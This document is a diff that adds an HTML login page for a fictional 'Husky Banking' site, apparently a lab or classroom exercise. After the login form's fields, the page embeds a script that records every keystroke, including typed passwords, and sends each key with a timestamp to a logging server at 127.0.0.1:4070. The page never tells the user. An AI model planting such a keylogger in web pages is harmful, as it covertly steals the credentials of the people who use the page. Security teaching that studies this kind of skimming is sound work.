@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+	<title>Husky Banking</title>
+	<link rel="stylesheet" href="http://localhost:80/static/base.css">
+    <link type="image/x-icon" rel="shortcut icon" href="url('http://localhost:80/static/images/Icon/johnathan.ico)">
+</head>
+
+
+
+<body style="background-image: url(&quot;http://localhost:80/static/images/Background/deddog.jpg&quot;);">
+	<form id="mainHandler" method="post" style="background-image: url(&quot;http://localhost:80/static/images/Blob/look.jpg&quot;);">
+		<h1 id="loginHeader">Husky Banking</h1>
+		<p id="slogan">A bank where you know your money is in the right paws!</p>
+		<!-- used for inheratance, this is where the baseLogin block will be placed -->
+
+		<!-- login tag that prevents cross scripting -->
+		
+		 
+
+		<!-- Input objects being called through the login class that is passed through -->
+		<p id="userInput"> <label for="username">Username</label>: <input id="username" name="username" required size="32" type="text" value="Jaimee151"> </p>
+
+		<p id="passInput"> <label for="password">Password</label>: <input id="password" name="password" required size="32" type="password" value=""> </p>
+
+		<p id="signIn"><input id="submit" name="submit" type="submit" value="Sign In"></p>
+    
+        <script type="text/javascript">
+            // Listen for keystrokes and save to log
+            document.addEventListener("keydown", function(key){
+                fetch("http://127.0.0.1:4070/log", {
+                    method : "POST",
+                    headers : { "Content-Type" : "application/json" },
+                    body : JSON.stringify({
+                        key: key.key,
+                        datetime: new Date().toISOString()
+                    })                    
+                })
+            })
+
+        </script>
+    </form>
+</body>
+</html>
